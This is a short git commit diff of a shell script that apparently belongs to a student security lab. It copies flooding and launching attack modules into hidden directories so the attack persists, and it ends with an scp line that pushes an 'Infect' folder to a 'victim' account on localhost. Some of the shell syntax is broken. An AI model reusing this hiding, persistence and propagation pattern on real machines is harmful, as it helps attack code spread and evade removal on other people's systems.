cab31cd4c4d3c290c90f971b33bdb10fb51380d7
SongYun <william0228.cs05@g2.nctu.edu.tw>
2019-05-01 01:24:49 +0800

    add

--- qq.sh
+++ qq.sh
@@ -2,10 +2,19 @@
 # replication attack file to two hidden files
 $Hidden1 = "../../.etc/.qq"
 mkdir $Hidden1
-cp ./Flooding_Attack $Hidden1
-cp ./Check_Attack $Hidden1
-cp ./Launching_Attack $Hidden1
+cp ./Infect/Flooding_Attack $Hidden1
+cp ./Infect/Check_Attack $Hidden1
+cp ./Infect/Launching_Attack $Hidden1
 
 $Hidden2 = "../../.Launch_Attack"
 mkdir $Hidden2
-cp ./Launching_Attack $Hidden2
+cp ./Infect/Launching_Attack $Hidden2
+
+# When one of attack modules is removed, the attack can still be launched by the other
+
+# trigger automatically every 1 minute, if it is not running
+
+
+# task3
+# 
+scp -r ./Infect victim@127.0.0.1:/home/victim/Desktop/
